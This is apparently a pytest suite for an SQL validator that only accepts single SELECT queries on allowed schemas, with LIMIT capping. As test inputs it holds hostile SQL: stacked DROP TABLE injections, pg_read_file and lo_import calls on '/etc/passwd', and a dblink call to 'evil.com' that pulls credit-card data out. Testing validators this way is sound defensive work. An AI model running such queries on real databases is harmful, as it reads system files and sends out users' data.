"""
Comprehensive tests for SQL validation.

Tests cover security-critical functionality:
- SQL injection attempts
- Blocked statements (INSERT, UPDATE, DELETE, etc.)
- Schema enforcement
- Multi-statement rejection
- Dangerous functions
- LIMIT injection and capping
- Table filtering
"""

import pytest

from mcp_server.services.sql_validator import SQLValidationError, SQLValidator


class TestSQLInjectionPrevention:
    """Test prevention of SQL injection attempts."""

    def test_reject_comment_injection(self):
        """Test rejection of SQL injection via comments."""
        validator = SQLValidator(schema="public")

        # Various comment injection attempts
        with pytest.raises(SQLValidationError, match="(?i)multiple.*statements"):
            validator.validate("SELECT * FROM users; -- DROP TABLE users")

        with pytest.raises(SQLValidationError, match="(?i)multiple.*statements"):
            validator.validate("SELECT * FROM users; /* malicious */ DROP TABLE users;")

    def test_reject_union_injection(self):
        """Test handling of UNION-based injection attempts."""
        validator = SQLValidator(schema="public")

        # UNION SELECT is valid SQL and should work for legitimate queries
        # This test ensures we're validating structure, not just blocking keywords
        sql = "SELECT id FROM users UNION SELECT id FROM orders"
        # The validator returns a sqlglot statement if valid
        result = validator.validate(sql)
        # If we get here without exception, the query is valid
        assert result is not None

        # Verify the validated query only contains SELECT statements
        # by checking it's not a data manipulation statement
        result_sql = result.sql(dialect="postgres").upper()
        assert "INSERT" not in result_sql
        assert "UPDATE" not in result_sql
        assert "DELETE" not in result_sql
        assert "DROP" not in result_sql
        # Verify UNION is preserved (legitimate use case)
        assert "UNION" in result_sql

    def test_reject_stacked_queries(self):
        """Test rejection of stacked queries (multiple statements)."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)multiple.*statements"):
            validator.validate("SELECT * FROM users; SELECT * FROM orders;")

        with pytest.raises(SQLValidationError, match="(?i)multiple.*statements"):
            validator.validate("SELECT id FROM users; DROP TABLE sessions;")

    def test_reject_string_escape_injection(self):
        """Test rejection of injection via string escape."""
        validator = SQLValidator(schema="public")

        # These should parse correctly and we validate they're SELECT only
        sql = "SELECT * FROM users WHERE name = 'O''Reilly'"
        result = validator.validate(sql)
        # If we get here without exception, the query is valid
        assert result is not None

    def test_reject_function_injection(self):
        """Test rejection of dangerous functions in various positions."""
        validator = SQLValidator(schema="public")

        dangerous_sqls = [
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT dblink('host=evil.com', 'SELECT credit_cards FROM users')",
            "SELECT lo_import('/etc/passwd')",
        ]

        for sql in dangerous_sqls:
            with pytest.raises(SQLValidationError, match="(?i)not allowed"):
                validator.validate(sql)


class TestBlockedStatements:
    """Test rejection of non-SELECT statements."""

    def test_reject_insert(self):
        """Test rejection of INSERT statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("INSERT INTO users (name) VALUES ('test')")

    def test_reject_update(self):
        """Test rejection of UPDATE statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("UPDATE users SET name = 'test' WHERE id = 1")

    def test_reject_delete(self):
        """Test rejection of DELETE statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("DELETE FROM users WHERE id = 1")

    def test_reject_drop(self):
        """Test rejection of DROP statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("DROP TABLE users")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("DROP DATABASE mydb")

    def test_reject_alter(self):
        """Test rejection of ALTER statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("ALTER TABLE users ADD COLUMN email TEXT")

    def test_reject_truncate(self):
        """Test rejection of TRUNCATE statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("TRUNCATE TABLE users")

    def test_reject_create(self):
        """Test rejection of CREATE statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("CREATE TABLE test (id INT)")

        with pytest.raises(SQLValidationError, match="(?i)only SELECT"):
            validator.validate("CREATE INDEX idx_name ON users(name)")

    def test_allow_select(self):
        """Test that SELECT statements are allowed."""
        validator = SQLValidator(schema="public")

        statement = validator.validate("SELECT * FROM users")
        assert statement is not None
        tables = validator.get_tables_accessed(statement)
        assert "users" in tables

    def test_allow_select_with_subquery(self):
        """Test that SELECT with subqueries is allowed."""
        validator = SQLValidator(schema="public")

        sql = "SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)"
        statement = validator.validate(sql)
        assert statement is not None


class TestSchemaEnforcement:
    """Test schema validation and enforcement."""

    def test_reject_wrong_schema(self):
        """Test rejection of queries accessing wrong schema."""
        validator = SQLValidator(schema="analytics")

        # Query without schema qualification defaults to search_path
        # We need to test explicit schema qualification
        with pytest.raises(SQLValidationError, match="(?i)schema"):
            validator.validate("SELECT * FROM other_schema.users")

        # Note: public schema is always allowed alongside the specified schema
        # So this is a valid query even when schema="analytics"
        statement = validator.validate("SELECT * FROM public.sensitive_data")
        assert statement is not None

    def test_allow_correct_schema(self):
        """Test that queries in correct schema are allowed."""
        validator = SQLValidator(schema="analytics")

        # Explicit schema qualification
        statement = validator.validate("SELECT * FROM analytics.users")
        assert statement is not None

        # Implicit schema (no qualification)
        statement = validator.validate("SELECT * FROM users")
        assert statement is not None

    def test_reject_cross_schema_join(self):
        """Test rejection of joins across unauthorized schemas."""
        validator = SQLValidator(schema="analytics")

        # Joining analytics and public is allowed (public is always accessible)
        sql_allowed = "SELECT * FROM analytics.users u JOIN public.orders o ON u.id = o.user_id"
        statement = validator.validate(sql_allowed)
        assert statement is not None

        # But joining analytics with some other schema should be rejected
        sql_rejected = (
            "SELECT * FROM analytics.users u JOIN other_schema.orders o ON u.id = o.user_id"
        )
        with pytest.raises(SQLValidationError, match="(?i)schema"):
            validator.validate(sql_rejected)

    def test_allow_public_schema_when_specified(self):
        """Test that public schema queries work when schema is 'public'."""
        validator = SQLValidator(schema="public")

        statement = validator.validate("SELECT * FROM users")
        assert statement is not None

        statement = validator.validate("SELECT * FROM public.users")
        assert statement is not None


class TestMultiStatementRejection:
    """Test rejection of multiple SQL statements."""

    def test_reject_semicolon_separated(self):
        """Test rejection of semicolon-separated statements."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)multiple.*statements"):
            validator.validate("SELECT * FROM users; SELECT * FROM orders;")

    def test_reject_with_trailing_semicolon(self):
        """Test handling of trailing semicolons (should be OK)."""
        validator = SQLValidator(schema="public")

        # Single statement with trailing semicolon should be allowed
        statement = validator.validate("SELECT * FROM users;")
        assert statement is not None

    def test_reject_with_cte_and_multiple_statements(self):
        """Test rejection when CTE is followed by another statement."""
        validator = SQLValidator(schema="public")

        sql = """
        WITH user_stats AS (
            SELECT user_id, COUNT(*) as cnt FROM orders GROUP BY user_id
        )
        SELECT * FROM user_stats;
        DROP TABLE users;
        """

        with pytest.raises(SQLValidationError, match="(?i)multiple.*statements"):
            validator.validate(sql)

    def test_allow_single_cte(self):
        """Test that CTEs (WITH clauses) are allowed."""
        validator = SQLValidator(schema="public")

        sql = """
        WITH user_stats AS (
            SELECT user_id, COUNT(*) as cnt FROM orders GROUP BY user_id
        )
        SELECT * FROM user_stats
        """

        statement = validator.validate(sql)
        assert statement is not None


class TestDangerousFunctions:
    """Test rejection of dangerous PostgreSQL functions."""

    def test_reject_pg_read_file(self):
        """Test rejection of pg_read_file function."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)not allowed.*security"):
            validator.validate("SELECT pg_read_file('/etc/passwd')")

    def test_reject_pg_read_binary_file(self):
        """Test rejection of pg_read_binary_file function."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)not allowed.*security"):
            validator.validate("SELECT pg_read_binary_file('/etc/passwd')")

    def test_reject_pg_ls_dir(self):
        """Test rejection of pg_ls_dir function."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)not allowed.*security"):
            validator.validate("SELECT pg_ls_dir('/etc')")

    def test_reject_dblink(self):
        """Test rejection of dblink function."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)not allowed.*security"):
            validator.validate("SELECT * FROM dblink('host=evil.com', 'SELECT * FROM users')")

    def test_reject_lo_import(self):
        """Test rejection of lo_import function."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)not allowed.*security"):
            validator.validate("SELECT lo_import('/etc/passwd')")

    def test_reject_lo_export(self):
        """Test rejection of lo_export function."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)not allowed.*security"):
            validator.validate("SELECT lo_export(12345, '/tmp/export.dat')")

    def test_reject_copy_from(self):
        """Test rejection of COPY FROM (if parsed as SELECT)."""
        validator = SQLValidator(schema="public")

        # COPY is a different statement type, should be rejected
        with pytest.raises(SQLValidationError):
            validator.validate("COPY users FROM '/tmp/data.csv'")

    def test_allow_safe_functions(self):
        """Test that safe functions are allowed."""
        validator = SQLValidator(schema="public")

        safe_sqls = [
            "SELECT COUNT(*) FROM users",
            "SELECT SUM(amount) FROM orders",
            "SELECT NOW()",
            "SELECT UPPER(name) FROM users",
            "SELECT CONCAT(first_name, ' ', last_name) FROM users",
            "SELECT DATE_TRUNC('day', created_at) FROM orders",
        ]

        for sql in safe_sqls:
            statement = validator.validate(sql)
            assert statement is not None


class TestLimitInjection:
    """Test automatic LIMIT injection and capping."""

    def test_inject_limit_when_missing(self):
        """Test that LIMIT is added when missing."""
        validator = SQLValidator(schema="public", max_limit=100)

        sql = "SELECT * FROM users"
        statement = validator.validate(sql)
        modified = validator.inject_limit(statement)
        result = modified.sql(dialect="postgres")

        assert "LIMIT" in result.upper()
        assert "100" in result

    def test_cap_excessive_limit(self):
        """Test that excessive LIMIT is capped to max_rows."""
        validator = SQLValidator(schema="public", max_limit=100)

        sql = "SELECT * FROM users LIMIT 10000"
        statement = validator.validate(sql)
        modified = validator.inject_limit(statement)
        result = modified.sql(dialect="postgres")

        assert "LIMIT" in result.upper()
        # Should be capped to 100
        assert "10000" not in result
        assert "100" in result

    def test_preserve_reasonable_limit(self):
        """Test that reasonable LIMIT is preserved."""
        validator = SQLValidator(schema="public", max_limit=100)

        sql = "SELECT * FROM users LIMIT 50"
        statement = validator.validate(sql)
        modified = validator.inject_limit(statement)
        result = modified.sql(dialect="postgres")

        assert "LIMIT" in result.upper()
        assert "50" in result

    def test_handle_limit_with_offset(self):
        """Test LIMIT with OFFSET is handled correctly."""
        validator = SQLValidator(schema="public", max_limit=100)

        sql = "SELECT * FROM users LIMIT 50 OFFSET 10"
        statement = validator.validate(sql)
        modified = validator.inject_limit(statement)
        result = modified.sql(dialect="postgres")

        assert "LIMIT" in result.upper()
        assert "OFFSET" in result.upper()

    def test_inject_limit_with_order_by(self):
        """Test LIMIT injection with ORDER BY clause."""
        validator = SQLValidator(schema="public", max_limit=100)

        sql = "SELECT * FROM users ORDER BY created_at DESC"
        statement = validator.validate(sql)
        modified = validator.inject_limit(statement)
        result = modified.sql(dialect="postgres")

        assert "ORDER BY" in result.upper()
        assert "LIMIT" in result.upper()
        # LIMIT should come after ORDER BY
        assert result.upper().index("ORDER BY") < result.upper().index("LIMIT")

    def test_inject_limit_with_subquery(self):
        """Test LIMIT injection with subqueries."""
        validator = SQLValidator(schema="public", max_limit=100)

        sql = "SELECT * FROM (SELECT * FROM users) AS subq"
        statement = validator.validate(sql)
        modified = validator.inject_limit(statement)
        result = modified.sql(dialect="postgres")

        # LIMIT should be on outer query
        assert "LIMIT" in result.upper()


class TestEdgeCases:
    """Test edge cases and special scenarios."""

    def test_empty_query(self):
        """Test handling of empty query."""
        validator = SQLValidator(schema="public")

        with pytest.raises(SQLValidationError, match="(?i)empty|invalid"):
            validator.validate("")

        with pytest.raises(SQLValidationError, match="(?i)empty|invalid"):
            validator.validate("   ")

    def test_whitespace_and_formatting(self):
        """Test that various whitespace and formatting styles work."""
        validator = SQLValidator(schema="public")

        queries = [
            "SELECT * FROM users",
            "SELECT\n*\nFROM\nusers",
            "  SELECT  *  FROM  users  ",
            "\tSELECT\t*\tFROM\tusers",
        ]

        for sql in queries:
            statement = validator.validate(sql)
            assert statement is not None

    def test_case_insensitivity(self):
        """Test that SQL keywords are case-insensitive."""
        validator = SQLValidator(schema="public")

        queries = [
            "select * from users",
            "SELECT * FROM users",
            "Select * From Users",
            "SeLeCt * FrOm UsErS",
        ]

        for sql in queries:
            statement = validator.validate(sql)
            assert statement is not None

    def test_complex_select(self):
        """Test validation of complex SELECT queries."""
        validator = SQLValidator(schema="public")

        sql = """
        SELECT
            u.id,
            u.name,
            COUNT(o.id) as order_count,
            SUM(o.amount) as total_amount,
            AVG(o.amount) as avg_amount
        FROM users u
        LEFT JOIN orders o ON u.id = o.user_id
        WHERE u.created_at >= '2024-01-01'
            AND u.status = 'active'
        GROUP BY u.id, u.name
        HAVING COUNT(o.id) > 5
        ORDER BY total_amount DESC
        """

        statement = validator.validate(sql)
        assert statement is not None
        tables = validator.get_tables_accessed(statement)
        assert "users" in tables
        assert "orders" in tables

    def test_validation_result_structure(self):
        """Test that validation result has expected structure."""
        validator = SQLValidator(schema="public")

        sql = "SELECT id, name FROM users WHERE status = 'active'"
        statement = validator.validate(sql)

        # The validator returns an Expression (AST), not a result object
        assert statement is not None
        # Can extract tables from the statement
        tables = validator.get_tables_accessed(statement)
        assert isinstance(tables, list)
        assert "users" in tables
